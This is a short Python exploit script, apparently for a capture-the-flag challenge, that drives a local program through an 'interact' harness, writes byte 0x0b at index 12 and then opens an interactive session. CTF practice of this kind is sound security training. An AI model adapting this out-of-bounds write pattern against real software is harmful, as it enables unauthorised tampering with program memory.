import interact
import struct

# Pack integer 'n' into a 4-Byte representation
def p32(n):
    return struct.pack('I', n)

# Unpack 4-Byte-long string 's' into a Python integer
def u32(s):
    return struct.unpack('I', s)[0]

p = interact.Process()
data = p.readuntil('index:')
p.sendline('12')
data = p.readuntil('to:')
p.sendline('\x0b')

p.interactive()
